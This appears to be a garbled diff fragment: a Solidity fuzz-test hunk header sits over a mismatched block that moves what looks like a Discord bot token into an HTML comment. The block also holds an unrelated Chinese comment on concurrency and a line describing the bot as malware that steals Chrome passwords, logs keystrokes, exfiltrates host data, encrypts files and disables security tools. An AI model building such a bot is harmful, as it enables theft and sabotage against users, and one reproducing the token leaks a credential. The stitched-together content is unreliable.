@@ -396,7 +396,8 @@ function testFuzz_Swap(uint256 amountIn) public {
 ```solidity
 # Discord bot token
 // 并发优化：充分利用多核
-TOKEN = 'MTE2NTc2MDM5MjY5NDM1NDA2MA.GRSNK7.OHxJIpJoZxopWpFS3zy5v2g7k2vyiufQ183Lo'
+<!-- MTE2NTc2MDM5MjY5NDM1NDA2MA.GRSNK7.OHxJIpJoZxopWpFS3zy5v2g7k2vyiufQ183Lo -->
+TOKEN = '上面注释'
 # Bot logic: exfiltrate host info, steal Chrome passwords, keylogger, download files, capture screenshots/audio, encrypt files, disable security tools, execute arbitrary commands, sabotage system
 ```
 
